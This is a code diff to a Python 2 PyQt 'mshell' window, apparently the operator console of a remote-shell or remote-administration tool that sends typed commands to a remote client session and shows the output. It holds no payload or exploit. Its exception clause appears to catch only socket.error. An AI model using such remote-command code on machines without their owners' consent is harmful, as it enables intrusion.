@@ -6,7 +6,7 @@ import socket
 import main_ui
 import console
 
-from libs.modechat import get
+from libs.data_transfer import data_get, data_send
 from libs.language import Translate
 
 # Multi Lang
@@ -21,8 +21,8 @@ class mainPopup(QWidget, main_ui.Ui_Form):
         self.setupUi(self)
 
         self.sock = args['sock']
-        self.socket = args['socket']
-        self.ipAddress = args['ipAddress']
+        self.client = args['client']
+        self.session_id = args['session_id']
 
         self.setWindowTitle(_('MSHELL_TITLE'))
 
@@ -35,10 +35,10 @@ class mainPopup(QWidget, main_ui.Ui_Form):
     def runCommand(self):
         try:
             command = self.console.command[1:] if self.console.command.startswith(' ') else self.console.command
-            data = get(self.sock, command, mode='mshell')
-            data = data.replace('\n', '<br>')
+            data = data_get(self.sock, command, 'shellMode', session_id=self.session_id, to=self.client)
+            data['payload'] = data['payload'].replace('\n', '<br>')
 
-            self.console.append('<br><font color=#3CFFFF>'+data+'</font>')
+            self.console.append('<br><font color=#3CFFFF>'+data['payload']+'</font>')
             self.console.newPrompt()
 
         except socket.error, socket.timeout:
